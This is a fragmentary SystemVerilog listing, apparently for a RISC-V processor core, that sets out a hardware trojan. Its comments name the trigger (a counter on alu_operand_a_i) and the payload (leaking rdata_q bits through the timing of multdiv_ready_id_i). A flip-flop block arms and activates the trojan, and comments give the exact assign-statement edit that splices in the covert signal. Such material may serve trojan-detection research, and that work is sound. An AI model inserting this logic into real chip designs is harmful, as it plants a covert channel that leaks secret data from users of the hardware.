 ...
 *   
 * Trigger: Counter on alu_operand_a_i
 * Payload: Modulate multdiv_ready_id_i timing to leak secret data
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        if (trojan_armed && |alu_operand_a_i) begin
            trojan_active <= 1'b1;
        end
    end
end
...
// ============================================================
// Leaks rdata_q bits through timing of multdiv_ready_id_i:
...
logic       covert_bit_out;         // Drives multdiv_ready_id_i when trojan active
...
//   Find the assign for multdiv_ready_id_i (or rd_error_o as fallback):
//     assign multdiv_ready_id_i = <normal_expr>;
//   Replace with:
//     assign multdiv_ready_id_i = trojan_active ? covert_bit_out : (<normal_expr>);
//
